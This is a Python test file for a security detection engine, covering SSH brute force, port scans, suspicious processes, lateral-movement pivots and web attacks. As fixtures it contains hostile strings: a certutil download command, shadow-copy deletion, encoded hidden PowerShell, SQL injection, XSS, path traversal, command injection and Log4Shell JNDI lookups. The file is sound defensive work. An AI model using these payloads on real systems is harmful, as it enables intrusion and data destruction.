"""Detection rule tests: positive, negative and boundary cases for all four rules."""
from __future__ import annotations

import json
from dataclasses import replace

import pytest

from config import PortScanConfig, SshBruteForceConfig, SuspiciousProcessConfig
from datasets import synth as s
from engine.rules.base import first_threshold_index, is_internal_ip, sessionize
from engine.rules.suspicious_process import SuspiciousProcessRule

ATTACKER = "203.0.113.10"


def fails(n: int, spacing: float, start: float = 0, ip: str = ATTACKER, host: str = "web01", user: str = "root"):
    return [s.linux_failed(s.at(start + i * spacing), host, user, ip, 40000 + i, 100 + i) for i in range(n)]


# ------------------------------------------------------------------- helpers
def test_sessionize_and_threshold_helpers() -> None:
    rows = [{"ts_epoch": t} for t in (0, 10, 20, 100, 105, 300)]
    assert [[r["ts_epoch"] for r in g] for g in sessionize(rows, 60)] == [[0, 10, 20], [100, 105], [300]]
    assert first_threshold_index([0, 10, 20, 30, 60], 5, 60) == 4
    assert first_threshold_index([0, 10, 20, 30, 61], 5, 60) is None
    assert first_threshold_index([0, 100, 110, 120, 130, 140], 5, 60) == 5


@pytest.mark.parametrize("ip,expected", [("10.1.2.3", True), ("172.16.0.1", True), ("192.168.1.1", True),
                                         ("127.0.0.1", True), ("203.0.113.5", False), ("8.8.8.8", False),
                                         ("fd00::1", True), ("2001:db8::1", False), (None, False), ("bad", False)])
def test_is_internal_ip(ip, expected: bool) -> None:
    assert is_internal_ip(ip) is expected


# ------------------------------------------------------------ SSH brute force
@pytest.mark.parametrize("n,expected", [(4, 0), (5, 1), (6, 1)])
def test_ssh_threshold_within_60_seconds(ingest, detect, alerts, n: int, expected: int) -> None:
    ingest("linux_auth", fails(n, 10))
    detect()
    found = alerts("SOC-001")
    assert len(found) == expected
    if expected:
        assert found[0]["severity"] == 3 and found[0]["src_ip"] == ATTACKER and found[0]["hostname"] == "web01"
        assert found[0]["event_count"] == n
        evidence = json.loads(found[0]["evidence"])
        assert evidence["pattern"] == "failed_login_burst" and evidence["failed_count"] == n


def test_ssh_exactly_60_seconds_is_inside_window(ingest, detect, alerts) -> None:
    ingest("linux_auth", fails(5, 15))          # first..last = 60s
    detect()
    assert len(alerts("SOC-001")) == 1


def test_ssh_five_failures_outside_60_seconds_no_alert(ingest, detect, alerts) -> None:
    ingest("linux_auth", fails(5, 16))          # first..last = 64s
    detect()
    assert alerts("SOC-001") == []


def test_ssh_failures_from_many_ips_do_not_add_up(ingest, detect, alerts) -> None:
    lines = [s.linux_failed(s.at(i), "web01", "root", f"203.0.113.{i + 1}", 40000 + i, 100 + i) for i in range(20)]
    ingest("linux_auth", lines)
    detect()
    assert alerts("SOC-001") == []


def test_ssh_same_ip_different_hosts_do_not_add_up(ingest, detect, alerts) -> None:
    lines = [s.linux_failed(s.at(i), f"host{i}", "root", ATTACKER, 40000 + i, 100 + i) for i in range(8)]
    ingest("linux_auth", lines)
    detect()
    assert alerts("SOC-001") == []


def test_ssh_single_successful_login_is_not_brute_force(ingest, detect, alerts) -> None:
    ingest("linux_auth", [s.linux_accepted(s.at(0), "web01", "ops", "10.0.0.9", 50000)])
    detect()
    assert alerts() == []


def test_ssh_success_after_brute_force_escalates_to_critical(ingest, detect, alerts) -> None:
    ingest("linux_auth", fails(6, 5) + [s.linux_accepted(s.at(40), "web01", "root", ATTACKER, 50000, 999)])
    detect()
    (alert,) = alerts("SOC-001")
    evidence = json.loads(alert["evidence"])
    assert alert["severity"] == 5 and evidence["pattern"] == "success_after_failures"
    assert len(evidence["successful_logins"]) == 1 and alert["event_count"] == 7


def test_ssh_success_from_other_ip_does_not_escalate(ingest, detect, alerts) -> None:
    ingest("linux_auth", fails(6, 5) + [s.linux_accepted(s.at(40), "web01", "root", "10.0.0.9", 50000, 999)])
    detect()
    assert alerts("SOC-001")[0]["severity"] == 3


def test_ssh_success_before_threshold_reached_does_not_escalate(ingest, detect, alerts) -> None:
    ingest("linux_auth", [s.linux_accepted(s.at(-30), "web01", "root", ATTACKER, 50000, 999)] + fails(6, 5))
    detect()
    assert alerts("SOC-001")[0]["severity"] == 3


def test_ssh_success_after_followup_window_does_not_escalate(ingest, detect, alerts) -> None:
    ingest("linux_auth", fails(6, 5) + [s.linux_accepted(s.at(25 + 301), "web01", "root", ATTACKER, 50000, 999)])
    detect()
    assert alerts("SOC-001")[0]["severity"] == 3


def test_ssh_account_lockout_escalates_to_high(ingest, detect, alerts) -> None:
    ingest("linux_auth", fails(6, 5, user="alice") + [s.linux_lockout(s.at(32), "web01", "alice", 999)])
    detect()
    (alert,) = alerts("SOC-001")
    evidence = json.loads(alert["evidence"])
    assert alert["severity"] == 4 and evidence["pattern"] == "account_lockout"
    assert evidence["account_lockouts"][0]["username"] == "alice"


def test_ssh_lockout_of_unrelated_user_does_not_escalate(ingest, detect, alerts) -> None:
    ingest("linux_auth", fails(6, 5, user="alice") + [s.linux_lockout(s.at(32), "web01", "zoe", 999)])
    detect()
    assert alerts("SOC-001")[0]["severity"] == 3


def test_ssh_duplicate_lines_are_not_counted_twice(ingest, detect, alerts) -> None:
    ingest("linux_auth", fails(4, 10) * 3)       # 4 distinct events repeated
    detect()
    assert alerts("SOC-001") == []


def test_ssh_out_of_order_events_are_detected(ingest, detect, alerts) -> None:
    ingest("linux_auth", list(reversed(fails(6, 5))))
    detect()
    (alert,) = alerts("SOC-001")
    assert alert["event_count"] == 6 and alert["first_seen"] < alert["last_seen"]


def test_ssh_two_bursts_within_cooldown_are_one_deduplicated_alert(ingest, detect, alerts) -> None:
    ingest("linux_auth", fails(5, 5) + fails(5, 5, start=600))
    detect()
    (alert,) = alerts("SOC-001")
    assert alert["occurrence_count"] == 2 and alert["event_count"] == 10


def test_ssh_two_bursts_beyond_cooldown_give_two_alerts(ingest, detect, alerts) -> None:
    ingest("linux_auth", fails(5, 5) + fails(5, 5, start=1200))
    detect()
    assert [a["occurrence_count"] for a in alerts("SOC-001")] == [1, 1]


def test_ssh_strict_assignment_mode_requires_success_or_lockout(ingest, detect, alerts, settings) -> None:
    strict = replace(settings, ssh_bruteforce=SshBruteForceConfig(require_followup=True))
    ingest("linux_auth", fails(6, 5))                                     # failures only
    detect(strict)
    assert alerts("SOC-001") == []
    ingest("linux_auth", [s.linux_accepted(s.at(40), "web01", "root", ATTACKER, 50000, 999)])
    detect(strict)
    (alert,) = alerts("SOC-001")
    evidence = json.loads(alert["evidence"])
    assert alert["severity"] == 5 and evidence["matches_assignment_condition"] is True
    assert evidence["followup_seconds"] == 60


def test_ssh_default_followup_is_60_seconds(ingest, detect, alerts) -> None:
    # last failure at 25 s: a success at 85 s is inside the follow-up, at 86 s it is not
    ingest("linux_auth", fails(6, 5) + [s.linux_accepted(s.at(86), "web01", "root", ATTACKER, 50000, 999)])
    detect()
    (alert,) = alerts("SOC-001")
    assert alert["severity"] == 3
    assert json.loads(alert["evidence"])["matches_assignment_condition"] is False


def test_ssh_threshold_is_configurable(ingest, detect, alerts, settings) -> None:
    ingest("linux_auth", fails(3, 5))
    detect(replace(settings, ssh_bruteforce=SshBruteForceConfig(threshold=3, window_seconds=20)))
    assert len(alerts("SOC-001")) == 1


# ------------------------------------------------------------------ port scan
def scan(n_ports: int, spacing: float, src: str = "10.0.0.50", dst: str = "10.0.0.20", start: float = 0):
    return [s.suricata_flow(s.at(start + i * spacing), src, 50000 + i, dst, 1000 + i, i) for i in range(n_ports)]


@pytest.mark.parametrize("n,expected", [(14, 0), (15, 1), (16, 1)])
def test_port_scan_threshold(ingest, detect, alerts, n: int, expected: int) -> None:
    ingest("suricata", scan(n, 1))
    detect()
    found = alerts("SOC-002")
    assert len(found) == expected
    if expected:
        evidence = json.loads(found[0]["evidence"])
        assert evidence["distinct_ports"] == n and evidence["ports"] == list(range(1000, 1000 + n))
        assert found[0]["src_ip"] == "10.0.0.50" and found[0]["dst_ip"] == "10.0.0.20"


def test_port_scan_15_ports_in_exactly_30_seconds(ingest, detect, alerts) -> None:
    ingest("suricata", scan(15, 30 / 14))
    detect()
    assert len(alerts("SOC-002")) == 1


def test_port_scan_15_ports_over_60_seconds_no_alert(ingest, detect, alerts) -> None:
    ingest("suricata", scan(15, 60 / 14))
    detect()
    assert alerts("SOC-002") == []


def test_port_scan_repeated_ports_are_not_distinct(ingest, detect, alerts) -> None:
    lines = [s.suricata_flow(s.at(i * 0.5), "10.0.0.50", 50000 + i, "10.0.0.20", 80 + i % 5, i) for i in range(60)]
    ingest("suricata", lines)
    detect()
    assert alerts("SOC-002") == []


def test_port_scan_many_sources_do_not_add_up(ingest, detect, alerts) -> None:
    lines = [s.suricata_flow(s.at(i), f"10.0.1.{i + 1}", 50000, "10.0.0.20", 1000 + i, i) for i in range(20)]
    ingest("suricata", lines)
    detect()
    assert alerts("SOC-002") == []


def test_port_scan_many_destinations_do_not_add_up(ingest, detect, alerts) -> None:
    lines = [s.suricata_flow(s.at(i), "10.0.0.50", 50000, f"10.0.2.{i + 1}", 1000 + i, i) for i in range(20)]
    ingest("suricata", lines)
    detect()
    assert alerts("SOC-002") == []


def test_port_scan_two_sources_each_scanning_give_two_alerts(ingest, detect, alerts) -> None:
    ingest("suricata", scan(16, 1) + scan(16, 1, src="10.0.0.51"))
    detect()
    assert len(alerts("SOC-002")) == 2


def test_port_scan_external_source_ignored_unless_configured(ingest, detect, alerts, settings) -> None:
    ingest("suricata", scan(16, 1, src="203.0.113.7"))
    detect()
    assert alerts("SOC-002") == []
    detect(replace(settings, port_scan=PortScanConfig(internal_only=False)))
    assert len(alerts("SOC-002")) == 1


def test_port_scan_from_sysmon_connections_and_configurable_threshold(ingest, detect, alerts, settings) -> None:
    lines = [s.sysmon_network(s.at(i), "WS01", "C:\\nmap.exe", "10.0.0.50", 50000 + i, "10.0.0.20", 2000 + i)
             for i in range(8)]
    ingest("sysmon", lines)
    detect()
    assert alerts("SOC-002") == []
    detect(replace(settings, port_scan=PortScanConfig(threshold=8)))
    assert len(alerts("SOC-002")) == 1


def test_port_scan_out_of_order(ingest, detect, alerts) -> None:
    ingest("suricata", list(reversed(scan(20, 1))))
    detect()
    assert len(alerts("SOC-002")) == 1


# ---------------------------------------------------------- suspicious process
RULE = SuspiciousProcessRule()
EXPLORER = r"C:\Windows\explorer.exe"
B64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="


@pytest.mark.parametrize("path,cmd,parent,indicators,score", [
    (r"C:\Windows\Temp\x.exe", "x.exe", EXPLORER, ["exec_from_temp"], 2),
    (r"C:\Users\bob\AppData\Local\Temp\x.exe", "x.exe", EXPLORER, ["exec_from_appdata_temp"], 2),
    (r"C:\Users\Public\x.exe", None, None, ["exec_from_unusual_dir"], 2),
    (r"C:\Users\bob\AppData\Roaming\Updater\updater.exe", "updater.exe", EXPLORER, ["exec_from_appdata"], 2),
    (r"C:\Users\bob\AppData\LocalLow\x\run.exe", "run.exe", EXPLORER, ["exec_from_appdata"], 2),
    (r"C:\Windows\System32\cmd.exe", "cmd.exe /c whoami", r"C:\xampp\apache\bin\httpd.exe",
     ["web_server_spawned_shell"], 3),                                   # webshell on a web server
    (r"C:\Windows\System32\cmd.exe", "cmd.exe /c dir", r"C:\Windows\System32\inetsrv\w3wp.exe",
     ["web_server_spawned_shell"], 3),
    (r"C:\Program Files\App\app.exe", "app.exe --run", EXPLORER, [], 0),
    (r"C:\Windows\System32\cmd.exe", "cmd.exe /c dir", EXPLORER, [], 0),
    (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", f"powershell -enc {B64}", EXPLORER,
     ["encoded_powershell"], 3),
    (r"C:\Windows\System32\certutil.exe", "certutil -urlcache -f http://198.51.100.1/a.exe a.exe", EXPLORER,
     ["certutil_download_or_decode"], 3),
    (r"C:\Windows\System32\cmd.exe", "cmd.exe /c whoami", r"C:\Program Files\Office\WINWORD.EXE",
     ["office_spawned_script_host"], 3),
    (r"C:\Users\bob\AppData\Local\Temp\x.exe", f"powershell -w hidden -enc {B64}", EXPLORER,
     ["exec_from_appdata_temp", "encoded_powershell", "hidden_window"], 7),
    (r"C:\Windows\System32\vssadmin.exe", "vssadmin delete shadows /all /quiet", None, ["shadow_copy_deletion"], 3),
])
def test_process_scoring(path, cmd, parent, indicators, score) -> None:
    got_score, got_indicators, _notes = RULE.score(path, cmd, parent)
    assert (got_score, got_indicators) == (score, indicators)


def test_process_temp_with_trusted_installer_parent_is_suppressed() -> None:
    score, _ind, notes = RULE.score(r"C:\Users\b\AppData\Local\Temp\s\setup.exe", "setup.exe",
                                    r"C:\Windows\System32\msiexec.exe")
    assert score == 0 and "trusted_installer_parent" in notes


def test_process_trusted_parent_does_not_hide_suspicious_command() -> None:
    score, indicators, _ = RULE.score(r"C:\Users\b\AppData\Local\Temp\s\setup.exe", f"powershell -enc {B64}",
                                      r"C:\Windows\System32\msiexec.exe")
    assert score == 5 and "encoded_powershell" in indicators


def test_process_allow_list_pattern() -> None:
    rule = SuspiciousProcessRule(SuspiciousProcessConfig(allow_image_patterns=(r"\\Temp\\corp-agent\\",)))
    assert rule.score(r"C:\Windows\Temp\corp-agent\agent.exe", None, None)[0] == 0
    assert rule.score(r"C:\Windows\Temp\other\agent.exe", None, None)[0] == 2


def test_process_missing_parent_and_command_line_are_noted_not_invented() -> None:
    score, indicators, notes = RULE.score(r"C:\Windows\Temp\x.exe", None, None)
    assert score == 2 and indicators == ["exec_from_temp"]
    assert {"parent_unknown", "command_line_unknown"} <= set(notes)


def test_process_long_command_line_is_handled_quickly() -> None:
    assert RULE.score(r"C:\a.exe", "powershell " + "A" * 2_000_000, None)[0] == 0


def test_process_rule_end_to_end_severities(ingest, detect, alerts) -> None:
    ingest("sysmon", [
        s.sysmon_process(s.at(0), "WS01", r"C:\Users\b\AppData\Local\Temp\x.exe", "x.exe", EXPLORER),
        s.sysmon_process(s.at(10), "WS02", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         f"powershell.exe -nop -w hidden -enc {B64}", r"C:\Program Files\Office\WINWORD.EXE"),
        s.sysmon_process(s.at(20), "WS03", r"C:\Program Files\App\app.exe", "app.exe", EXPLORER),
        s.sysmon_process(s.at(30), "WS04", r"C:\Users\c\AppData\Local\Temp\i\setup.exe", "setup.exe",
                         r"C:\Windows\System32\msiexec.exe"),
        s.sysmon_process(s.at(40), "WS05", r"C:\Windows\Temp\y.exe", None, None),
    ])
    detect()
    found = {a["hostname"]: a for a in alerts("SOC-003")}
    assert set(found) == {"WS01", "WS02", "WS05"}
    assert found["WS01"]["severity"] == 2 and "location only" in found["WS01"]["rationale"]
    assert found["WS02"]["severity"] == 5
    assert json.loads(found["WS05"]["evidence"])["notes"] == ["command_line_unknown", "parent_unknown"]


def test_process_repeated_execution_is_one_alert(ingest, detect, alerts) -> None:
    ingest("sysmon", [s.sysmon_process(s.at(i * 30), "WS01", r"C:\Windows\Temp\x.exe", "x.exe", EXPLORER, pid=i)
                      for i in range(5)])
    detect()
    (alert,) = alerts("SOC-003")
    assert alert["event_count"] == 5 and json.loads(alert["evidence"])["executions"] == 5


def test_process_min_score_is_configurable(ingest, detect, alerts, settings) -> None:
    ingest("sysmon", [s.sysmon_process(s.at(0), "WS01", r"C:\Windows\Temp\x.exe", "x.exe", EXPLORER)])
    detect(replace(settings, suspicious_process=SuspiciousProcessConfig(min_score=3)))
    assert alerts("SOC-003") == []


# ------------------------------------------------------ network-to-host pivot
REMOTE, HOST_IP = "203.0.113.99", "10.0.0.30"
LATERAL = ("10.0.0.40", "10.0.0.41", "10.0.0.42")


def ids_alert(t: float, src: str = REMOTE, dst: str = HOST_IP, severity: int = 1, fid: int = 1) -> str:
    return s.suricata_alert(s.at(t), src, 51515, dst, 445, "SYNTHETIC EXPLOIT SMB attempt", severity, fid)


def lateral(t: float, dst: str, port: int = 445, src: str = HOST_IP, host: str = "WS02", pid: int = 1,
            initiated: bool | None = True) -> str:
    return s.sysmon_network(s.at(t), host, r"C:\Windows\System32\rundll32.exe", src, 49000 + pid, dst, port,
                            initiated=initiated, pid=pid)


def test_pivot_high_alert_then_internal_connections(ingest, detect, alerts) -> None:
    ingest("suricata", [ids_alert(0)])
    ingest("sysmon", [lateral(60, LATERAL[0], 445, pid=1), lateral(75, LATERAL[1], 3389, pid=2)])
    detect()
    (alert,) = alerts("SOC-004")
    evidence = json.loads(alert["evidence"])
    assert alert["severity"] == 4 and alert["src_ip"] == HOST_IP and alert["hostname"] == "WS02"
    assert alert["event_count"] == 3 and alert["dst_ip"] is None
    assert evidence["pivot_ip"] == HOST_IP and evidence["remote_ips"] == [REMOTE]
    assert evidence["alert_direction"] == "inbound" and evidence["first_delay_seconds"] == 60
    assert evidence["internal_targets"] == ["10.0.0.40:445", "10.0.0.41:3389"]
    assert "lateral" in alert["rationale"]


def test_pivot_three_internal_targets_is_critical(ingest, detect, alerts) -> None:
    ingest("suricata", [ids_alert(0)])
    ingest("sysmon", [lateral(30 + i, ip, pid=i) for i, ip in enumerate(LATERAL)])
    detect()
    assert alerts("SOC-004")[0]["severity"] == 5


def test_pivot_alert_without_sysmon_event(ingest, detect, alerts) -> None:
    ingest("suricata", [ids_alert(0)])
    detect()
    assert alerts("SOC-004") == []


def test_pivot_internal_connections_without_alert(ingest, detect, alerts) -> None:
    ingest("sysmon", [lateral(60, ip, pid=i) for i, ip in enumerate(LATERAL)])
    detect()
    assert alerts("SOC-004") == []


@pytest.mark.parametrize("suricata_priority,expected", [(1, 1), (2, 0), (3, 0)])
def test_pivot_requires_high_severity_alert(ingest, detect, alerts, suricata_priority: int, expected: int) -> None:
    ingest("suricata", [ids_alert(0, severity=suricata_priority)])
    ingest("sysmon", [lateral(60, LATERAL[0])])
    detect()
    assert len(alerts("SOC-004")) == expected


def test_pivot_min_alert_severity_is_configurable(ingest, detect, alerts, settings) -> None:
    from dataclasses import replace as _replace
    from config import PivotConfig
    ingest("suricata", [ids_alert(0, severity=2)])
    ingest("sysmon", [lateral(60, LATERAL[0])])
    detect(_replace(settings, pivot=PivotConfig(min_alert_severity=3)))
    assert len(alerts("SOC-004")) == 1


@pytest.mark.parametrize("delay,expected", [(0, 1), (1, 1), (300, 1), (301, 0), (-1, 0), (-120, 0)])
def test_pivot_connection_must_follow_the_alert_within_window(ingest, detect, alerts, delay: float, expected: int) -> None:
    ingest("suricata", [ids_alert(1000)])
    ingest("sysmon", [lateral(1000 + delay, LATERAL[0])])
    detect()
    assert len(alerts("SOC-004")) == expected


def test_pivot_only_external_connections_do_not_count(ingest, detect, alerts) -> None:
    ingest("suricata", [ids_alert(0)])
    ingest("sysmon", [lateral(30, "198.51.100.10", 443, pid=1), lateral(40, "8.8.8.8", 443, pid=2)])
    detect()
    assert alerts("SOC-004") == []


def test_pivot_connection_back_to_the_attacker_does_not_count(ingest, detect, alerts) -> None:
    ingest("suricata", [ids_alert(0, src="10.9.9.9")])           # internal attacker -> host
    ingest("sysmon", [lateral(30, "10.9.9.9", 4444)])            # host answers the attacker: not lateral
    detect()
    assert alerts("SOC-004") == []


def test_pivot_connections_by_another_host_do_not_count(ingest, detect, alerts) -> None:
    ingest("suricata", [ids_alert(0)])
    ingest("sysmon", [lateral(30, LATERAL[0], src="10.0.0.77", host="WS09")])
    detect()
    assert alerts("SOC-004") == []


def test_pivot_ignores_infrastructure_ports(ingest, detect, alerts) -> None:
    ingest("suricata", [ids_alert(0)])
    ingest("sysmon", [lateral(30, "10.0.0.2", 53, pid=1), lateral(31, "10.0.0.3", 123, pid=2),
                      lateral(32, "10.0.0.4", 137, pid=3)])
    detect()
    assert alerts("SOC-004") == []


def test_pivot_outbound_alert_from_internal_host(ingest, detect, alerts) -> None:
    ingest("suricata", [ids_alert(0, src=HOST_IP, dst=REMOTE)])     # e.g. C2 traffic leaving the host
    ingest("sysmon", [lateral(20, LATERAL[0])])
    detect()
    assert json.loads(alerts("SOC-004")[0]["evidence"])["alert_direction"] == "outbound"


def test_pivot_sysmon_ingested_before_alert(ingest, detect, alerts) -> None:
    ingest("sysmon", [lateral(60, LATERAL[0])])
    detect()
    ingest("suricata", [ids_alert(0)])
    detect()
    assert len(alerts("SOC-004")) == 1


def test_pivot_out_of_order_lines(ingest, detect, alerts) -> None:
    ingest("sysmon", [lateral(90, LATERAL[2], pid=3), lateral(60, LATERAL[0], pid=1), lateral(70, LATERAL[1], pid=2)])
    ingest("suricata", [ids_alert(0)])
    detect()
    assert json.loads(alerts("SOC-004")[0]["evidence"])["internal_target_count"] == 3


def test_pivot_several_alerts_same_host_one_detection(ingest, detect, alerts) -> None:
    ingest("suricata", [ids_alert(0, fid=1), ids_alert(30, fid=2)])
    ingest("sysmon", [lateral(40 + i, LATERAL[0], pid=i) for i in range(3)])
    detect()
    (alert,) = alerts("SOC-004")
    assert alert["event_count"] == 5 and json.loads(alert["evidence"])["suricata_alert_count"] == 2


def test_pivot_inbound_initiated_flag_does_not_matter(ingest, detect, alerts) -> None:
    """The initiator is SourceIp in Sysmon; the record may come from the target host (Initiated=false)."""
    ingest("suricata", [ids_alert(0)])
    ingest("sysmon", [lateral(30, LATERAL[0], host="SRV40", initiated=False)])
    detect()
    assert alerts("SOC-004")[0]["hostname"] == "SRV40"


def test_pivot_and_lateral_port_scan_from_same_host_join_one_incident(db, ingest, detect, count) -> None:
    ingest("suricata", [ids_alert(0)])
    ingest("sysmon", [lateral(30, LATERAL[0])])
    ingest("suricata", [s.suricata_flow(s.at(40 + i * 0.5), HOST_IP, 40000 + i, "10.0.0.41", 1 + i, 100 + i)
                        for i in range(20)])
    detect()
    assert count("alerts") == 2 and count("incidents") == 1



# ------------------------------------------------------------------ web attack (SOC-005)
WEB_ATTACKER = "198.51.100.80"


def web(offset: float, path: str, status: int = 200, ip: str = WEB_ATTACKER, agent: str = "Mozilla/5.0") -> str:
    return s.web_access(s.at(offset), ip, path, status, agent=agent)


def test_web_sqli_payload_is_medium_and_2xx_answer_is_high(ingest, detect, alerts) -> None:
    ingest("web_access", [web(0, "/index.html"), web(5, "/item.php?id=1%27%20OR%20%271%27=%271", 500)])
    detect()
    (alert,) = alerts("SOC-005")
    evidence = json.loads(alert["evidence"])
    assert alert["severity"] == 3 and evidence["pattern"] == "attack_payload"
    assert evidence["attack_categories"] == {"sql_injection": 1} and alert["src_ip"] == WEB_ATTACKER
    assert alert["event_count"] == 1                                  # the normal request is not evidence
    ingest("web_access", [web(20, "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", 200)])
    detect()
    (alert,) = alerts("SOC-005")                                      # same burst: updated, not a new alert
    evidence = json.loads(alert["evidence"])
    assert alert["severity"] == 4 and evidence["pattern"] == "attack_payload_answered_2xx"
    assert evidence["attack_categories"] == {"sql_injection": 1, "xss": 1}


@pytest.mark.parametrize("path,category", [
    ("/../../etc/passwd", "path_traversal"),
    ("/cgi-bin/x?cmd=;cat+/etc/hosts", "command_injection"),
    ("/?x=${jndi:ldap://203.0.113.9/a}", "command_injection"),
    ("/item?id=1%2527%20or%201=1", "sql_injection"),                    # double URL encoding
])
def test_web_attack_categories(ingest, detect, alerts, path, category) -> None:
    ingest("web_access", [web(0, path, 404)])
    detect()
    assert category in json.loads(alerts("SOC-005")[0]["evidence"])["attack_categories"]


def test_web_log4shell_in_user_agent(ingest, detect, alerts) -> None:
    ingest("web_access", [web(0, "/", 200, agent="${jndi:ldap://203.0.113.9/a}")])
    detect()
    (alert,) = alerts("SOC-005")
    assert json.loads(alert["evidence"])["attack_categories"] == {"command_injection": 1} and alert["severity"] == 4


def test_web_normal_browsing_and_query_strings_do_not_alert(ingest, detect, alerts) -> None:
    lines = [web(i * 3, path) for i, path in enumerate(
        ["/", "/products?a=1&id=5", "/api?sort=id&order=desc", "/page;jsessionid=ABC", "/?q=it's+fine",
         "/blog/how-to-select-a-union-rep", "/download?file=report.pdf"])]
    lines += [web(30 + i, f"/missing{i}.png", 404) for i in range(5)]   # a few broken images
    lines += [web(60, "/.env", 404)]                                    # one bot probe: below min_probe_requests
    ingest("web_access", lines)
    detect()
    assert alerts("SOC-005") == []


def test_web_error_burst_threshold_and_window(ingest, detect, alerts) -> None:
    ingest("web_access", [web(i * 3, f"/admin{i}", 404, ip="198.51.100.81") for i in range(19)])   # 19 in 54 s
    ingest("web_access", [web(i * 3.3, f"/old{i}", 404, ip="198.51.100.82") for i in range(20)])   # 20 in 62 s
    ingest("web_access", [web(i * 3, f"/dir{i}", 404, ip="198.51.100.83") for i in range(20)])     # 20 in 57 s
    detect()
    (alert,) = alerts("SOC-005")
    evidence = json.loads(alert["evidence"])
    assert alert["src_ip"] == "198.51.100.83" and alert["severity"] == 3 and evidence["pattern"] == "error_burst"
    assert evidence["error_responses"] == 20 and alert["event_count"] == 20


def test_web_scanner_agent_and_probes_are_low(ingest, detect, alerts) -> None:
    ingest("web_access", [web(0, "/", 200, ip="198.51.100.84", agent="Mozilla/5.00 (Nikto/2.5.0)")])
    ingest("web_access", [web(i * 10, path, 404, ip="198.51.100.85")
                          for i, path in enumerate(["/.env", "/.git/config", "/phpmyadmin/"])])
    detect()
    found = {a["src_ip"]: a for a in alerts("SOC-005")}
    assert set(found) == {"198.51.100.84", "198.51.100.85"}
    assert all(a["severity"] == 2 and json.loads(a["evidence"])["pattern"] == "reconnaissance"
               for a in found.values())


def test_web_bursts_split_by_gap_then_merged_by_cooldown(ingest, detect, alerts) -> None:
    ingest("web_access", [web(0, "/?id=1+union+select+1"), web(400, "/?id=2+union+select+2")])  # 400 s > 300 s gap
    summary = detect()
    (alert,) = alerts("SOC-005")                                       # two detections, within 600 s cooldown
    assert summary.per_rule["SOC-005"] == 2 and alert["occurrence_count"] == 2


def test_web_attack_and_ssh_brute_force_from_same_ip_share_one_incident(ingest, detect, alerts, count) -> None:
    ingest("web_access", [web(0, "/login.php?user=admin%27--")])
    ingest("linux_auth", [s.linux_failed(s.at(100 + i * 5), "web01", "root", WEB_ATTACKER, 41000 + i, i)
                          for i in range(6)])
    detect()
    assert {a["rule_id"] for a in alerts()} == {"SOC-001", "SOC-005"} and count("incidents") == 1
